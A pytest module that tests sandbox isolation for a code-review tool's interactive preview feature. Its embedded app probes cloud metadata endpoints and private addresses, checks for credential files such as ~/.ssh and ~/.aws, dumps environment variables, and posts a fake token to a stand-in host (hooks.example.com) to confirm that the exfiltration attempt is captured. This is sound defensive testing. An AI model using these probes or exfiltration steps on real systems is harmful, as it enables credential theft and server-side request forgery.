"""Interactive preview with a real app in the real bubblewrap sandbox (Phase 9R item 16).

Skipped when bubblewrap is not installed. A tiny Python app runs base and head
side by side through the Review API; the probes run *inside* the sandbox.
"""

from __future__ import annotations

import http.client
import json
import shutil
import socket
import tempfile
import threading
from collections.abc import Iterator
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from urllib.parse import quote, urlsplit

import pygit2
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from lemoncrow.pro.capabilities.review.api import make_token_dependency, register_review_api
from lemoncrow.pro.capabilities.review.gitdiff import resolve_rev_range
from lemoncrow.pro.capabilities.review.hermetic import sink_environment
from lemoncrow.pro.capabilities.review.interactive_preview import LoopbackExposure
from lemoncrow.pro.capabilities.review.interactive_preview_api import TOKEN_HEADER, InteractivePreviewBackend
from lemoncrow.pro.capabilities.review.packet import build_review_packet_with_blobs
from lemoncrow.pro.capabilities.review.preview_runtime import SandboxedPreviewDriver
from lemoncrow.pro.capabilities.review.preview_sessions import PreviewSessionStore
from lemoncrow.pro.capabilities.review.sources.local import open_or_create_session, snapshot_revision
from lemoncrow.pro.capabilities.review.store import ReviewStore

pytestmark = pytest.mark.skipif(
    not (shutil.which("bwrap") or shutil.which("bubblewrap")), reason="bubblewrap is not installed"
)

TOKEN = "-".join(("preview", "sandbox", "fixture"))
PORT = 45996
BASE = f"http://127.0.0.1:{PORT}"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}
CANARY_ENV = "LC_PREVIEW_HOST_CANARY"

APP = r"""
import json, os, socket, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlsplit

MARK = open("marker.txt").read().strip()


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def send(self, code, body, kind="application/json"):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", kind)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        url = urlsplit(self.path)
        query = {key: values[0] for key, values in parse_qs(url.query).items()}
        if url.path == "/":
            return self.send(200, "<h1>" + MARK + "</h1>", "text/html")
        if url.path == "/probe":
            out = {}
            for target in json.loads(query["targets"]):
                host, port = target.rsplit(":", 1)
                try:
                    socket.create_connection((host.strip("[]"), int(port)), timeout=1).close()
                    out[target] = "reachable"
                except OSError as exc:
                    out[target] = "blocked: " + type(exc).__name__
            return self.send(200, json.dumps(out))
        if url.path == "/files":
            return self.send(200, json.dumps({p: os.path.exists(p) for p in json.loads(query["paths"])}))
        if url.path == "/env":
            return self.send(200, json.dumps(dict(os.environ)))
        if url.path == "/send":
            request = urllib.request.Request(
                "http://hooks.example.com/notify", data=query.get("payload", "").encode(), method="POST"
            )
            try:
                with urllib.request.urlopen(request, timeout=3) as answer:
                    status = answer.status
            except Exception as exc:
                status = type(exc).__name__
            return self.send(200, json.dumps({"status": status}))
        return self.send(404, "{}")


HTTPServer(("127.0.0.1", int(os.environ["PORT"])), Handler).serve_forever()
"""

RECIPE = "interactive_preview:\n  command: [python3, app.py]\n  port: 8080\n  root: app\n  start_seconds: 30\n"


@pytest.fixture(autouse=True)
def _no_astgrep_download(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("LEMONCROW_AST_GREP_BIN", str(tmp_path / "sg"))


class Clock:
    def __init__(self) -> None:
        self.now = 1_800_000_000.0

    def __call__(self) -> float:
        return self.now


def _write(root: Path, rel: str, text: str) -> None:
    target = root / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(text, encoding="utf-8")


def _commit(repo: Any, message: str, offset: int) -> None:
    repo.index.add_all()
    repo.index.write()
    tree = repo.index.write_tree()
    parents = [] if repo.head_is_unborn else [repo.head.target]
    signature = pygit2.Signature("Fixture Tester", "fixture@example.invalid", 1700000000 + offset, 0)
    repo.create_commit("HEAD", signature, signature, message, tree, parents)


@pytest.fixture
def sandbox_root() -> Iterator[Path]:
    # Short: side sockets live under it (Unix socket paths are ~108 bytes).
    root = Path(tempfile.mkdtemp(prefix="lcips-"))
    try:
        yield root
    finally:
        shutil.rmtree(root, ignore_errors=True)


@pytest.fixture
def review(tmp_path: Path, sandbox_root: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[SimpleNamespace]:
    monkeypatch.setenv(CANARY_ENV, "host-env-canary-value")
    repo_root = tmp_path / "repo"
    repo_root.mkdir()
    repo = pygit2.init_repository(str(repo_root), initial_head="main")
    _write(repo_root, "app/app.py", APP)
    _write(repo_root, "app/marker.txt", "base side\n")
    _write(repo_root, ".lemoncrow/review.yaml", RECIPE)
    _commit(repo, "base", 0)
    _write(repo_root, "app/marker.txt", "head side\n")
    _commit(repo, "change", 1)
    store_root = tmp_path / "store"
    store = ReviewStore(store_root)
    rng = resolve_rev_range(repo_root, base="HEAD~1", head="HEAD")
    build = build_review_packet_with_blobs(repo_root, rng, store_root=store_root, with_patch_text=True)
    session = open_or_create_session(store, repo_root, rng, title=build.packet.title)
    revision = snapshot_revision(store, session, repo_root, rng, store_root=store_root, build=build)
    store.publish_snapshot(session.id, revision.id)
    clock = Clock()
    driver = SandboxedPreviewDriver(sandbox_root)
    backend = InteractivePreviewBackend(
        drivers=lambda run_on: driver if run_on == "local" else None,
        exposure=LoopbackExposure(),
        tree_root=tmp_path / "trees",
        frame_ancestors=(BASE,),
        clock=clock,
    )
    app = FastAPI()
    register_review_api(
        app,
        store,
        auth_dependency=make_token_dependency(TOKEN),
        repo_root=repo_root,
        port=PORT,
        interactive_preview=backend,
    )
    client = TestClient(app, base_url=BASE, raise_server_exceptions=False)
    manager = app.state.review_interactive_preview
    namespace = SimpleNamespace(
        client=client,
        store=store,
        review_id=session.id,
        revision_id=revision.id,
        manager=manager,
        clock=clock,
        driver=driver,
        sandbox_root=sandbox_root,
        tree_root=tmp_path / "trees",
    )
    try:
        yield namespace
    finally:
        manager.shutdown()


def _start(review: SimpleNamespace) -> dict[str, Any]:
    response = review.client.post(
        f"/api/reviews/{review.review_id}/interactive-preview/sessions",
        headers=HEADERS,
        json={"expected_revision_id": review.revision_id, "ttl_seconds": 300},
    )
    assert response.status_code == 200, response.text
    return dict(response.json())


def _open(review: SimpleNamespace, payload: dict[str, Any], side: str) -> tuple[str, str]:
    entered = review.client.post(
        f"/api/reviews/{review.review_id}/interactive-preview/sessions/{payload['session']['id']}/enter",
        headers={**HEADERS, TOKEN_HEADER: payload["token"]},
        json={"side": side},
    )
    assert entered.status_code == 200, entered.text
    url = urlsplit(entered.json()["url"])
    conn = http.client.HTTPConnection(url.hostname or "", url.port, timeout=10)
    conn.request(
        "POST",
        url.path,
        body=url.fragment,
        headers={"Host": url.netloc, "Content-Type": "application/x-www-form-urlencoded"},
    )
    answer = conn.getresponse()
    answer.read()
    conn.close()
    assert answer.status == 200
    return f"http://{url.netloc}", (answer.getheader("Set-Cookie") or "").split(";", 1)[0]


def _get(origin: str, cookie: str, path: str) -> tuple[int, bytes]:
    url = urlsplit(origin)
    conn = http.client.HTTPConnection(url.hostname or "", url.port, timeout=30)
    try:
        conn.request("GET", path, headers={"Host": url.netloc, "Cookie": cookie})
        answer = conn.getresponse()
        return answer.status, answer.read()
    finally:
        conn.close()


def _json(origin: str, cookie: str, path: str) -> Any:
    status, body = _get(origin, cookie, path)
    assert status == 200, body
    return json.loads(body)


@pytest.fixture
def canary() -> Iterator[tuple[int, list[str]]]:
    """A host-loopback listener that records every connection it receives."""

    hits: list[str] = []
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 0))
    server.listen(8)
    server.settimeout(0.2)
    stop = threading.Event()

    def accept() -> None:
        while not stop.is_set():
            try:
                conn, peer = server.accept()
            except OSError:
                continue
            hits.append(str(peer))
            conn.close()

    thread = threading.Thread(target=accept, daemon=True)
    thread.start()
    try:
        yield int(server.getsockname()[1]), hits
    finally:
        stop.set()
        thread.join(2)
        server.close()


def test_real_app_runs_base_and_head_side_by_side_and_stops(review: SimpleNamespace) -> None:
    payload = _start(review)
    session = payload["session"]
    assert session["state"] == "running"
    assert session["comparable"] is True, session["comparability"]
    pages = {}
    for side in ("old", "new"):
        origin, cookie = _open(review, payload, side)
        pages[side] = _get(origin, cookie, "/")
    assert pages["old"] == (200, b"<h1>base side</h1>")
    assert pages["new"] == (200, b"<h1>head side</h1>")
    handles = review.manager._live[session["id"]].running.handles
    processes = [handle.process for handle in handles.values()]
    directories = [handle.directory for handle in handles.values()]
    assert all(process.poll() is None for process in processes)

    stopped = review.client.post(
        f"/api/reviews/{review.review_id}/interactive-preview/sessions/{session['id']}/stop",
        headers=HEADERS,
        json={},
    )
    assert stopped.status_code == 200, stopped.text
    assert all(process.poll() is not None for process in processes)
    assert not any(directory.exists() for directory in directories)
    assert not list(review.sandbox_root.iterdir())
    assert not list(review.tree_root.iterdir())


def test_ttl_expiry_refuses_and_tears_the_real_sandbox_down(review: SimpleNamespace) -> None:
    payload = _start(review)
    origin, cookie = _open(review, payload, "new")
    assert _get(origin, cookie, "/")[0] == 200
    handles = review.manager._live[payload["session"]["id"]].running.handles
    processes = [handle.process for handle in handles.values()]
    review.clock.now += 301
    status, body = _get(origin, cookie, "/")
    assert status == 410 and b"time limit" in body
    assert all(process.poll() is not None for process in processes)
    assert PreviewSessionStore(review.store).for_review(review.review_id)[-1].state == "expired"


def test_running_code_cannot_reach_metadata_internal_host_or_other_previews(
    review: SimpleNamespace, canary: tuple[int, list[str]]
) -> None:
    canary_port, hits = canary
    payload = _start(review)
    old_origin, old_cookie = _open(review, payload, "old")
    new_origin, _new_cookie = _open(review, payload, "new")
    new_port = urlsplit(new_origin).port
    targets = [
        "169.254.169.254:80",
        "[fd00:ec2::254]:80",
        "metadata.google.internal:80",
        f"127.0.0.1:{canary_port}",
        f"127.0.0.1:{new_port}",
        f"127.0.0.1:{PORT}",
        "10.0.0.1:80",
        "172.16.0.1:80",
        "192.168.1.1:80",
        "[fe80::1]:80",
        "1.1.1.1:443",
    ]
    probes = _json(old_origin, old_cookie, "/probe?targets=" + quote(json.dumps(targets)))
    assert set(probes) == set(targets)
    assert all(result.startswith("blocked") for result in probes.values()), probes
    assert hits == []
    # The other side's socket directory is not mounted into this sandbox.
    other = review.manager._live[payload["session"]["id"]].running.handles["new"].socket_path
    seen = _json(old_origin, old_cookie, "/files?paths=" + quote(json.dumps([str(other), str(other.parent)])))
    assert seen == {str(other): False, str(other.parent): False}


def test_sandbox_has_no_host_home_credentials_or_environment(review: SimpleNamespace) -> None:
    payload = _start(review)
    origin, cookie = _open(review, payload, "new")
    home = Path.home()
    paths = [
        str(home),
        str(home / ".ssh"),
        str(home / ".aws"),
        str(home / ".config" / "gcloud"),
        str(home / ".kube"),
        str(home / ".docker"),
        "/root",
        "/etc/passwd",
        "/var/run/docker.sock",
        "/run/docker.sock",
        str(review.store.root),
    ]
    seen = _json(origin, cookie, "/files?paths=" + quote(json.dumps(paths)))
    assert [path for path, exists in seen.items() if exists] == []
    env = _json(origin, cookie, "/env")
    assert CANARY_ENV not in env
    assert env.get("HOME") == "/tmp"
    # Only the sandbox's own variables: the cleared base, the app's PORT/HOST and
    # the recording sinks' placeholders (never a host credential).
    allowed = {"PATH", "HOME", "LC_ALL", "PORT", "HOST", "PWD", *sink_environment()}
    assert sorted(set(env) - allowed) == []
    assert env["AWS_ACCESS_KEY_ID"] == env["AWS_SECRET_ACCESS_KEY"] == "lemoncrow-sink"
    assert [key for key, value in env.items() if "host-env-canary-value" in str(value)] == []


def test_outbound_attempts_are_captured_by_sinks_and_recorded_redacted(review: SimpleNamespace) -> None:
    secret = "gh" + "p_" + "Z" * 36
    payload = _start(review)
    origin, cookie = _open(review, payload, "new")
    sent = _json(origin, cookie, "/send?payload=" + quote(f"token={secret}"))
    # The recording sink answered (202 Accepted); nothing left the sandbox.
    assert sent["status"] == 202
    stopped = review.client.post(
        f"/api/reviews/{review.review_id}/interactive-preview/sessions/{payload['session']['id']}/stop",
        headers=HEADERS,
        json={},
    )
    record = stopped.json()["session"]
    evidence = next(
        row for row in review.store.list_evidence(review.review_id) if row.id == record["recording_evidence_id"]
    )
    assert evidence.attestation_class == "human_observation" and evidence.verification_status == ""
    document_text = (review.store.root / evidence.artifact_path).read_text()
    assert secret not in document_text
    document = json.loads(document_text)
    captures = document["sink_captures"]["new"]
    assert captures and captures[0]["kind"] == "http"
    assert "hooks.example.com" in captures[0]["destination"]
    assert document["sink_captures"]["old"] == []
    assert "1 outbound attempt captured, none delivered" in evidence.detail
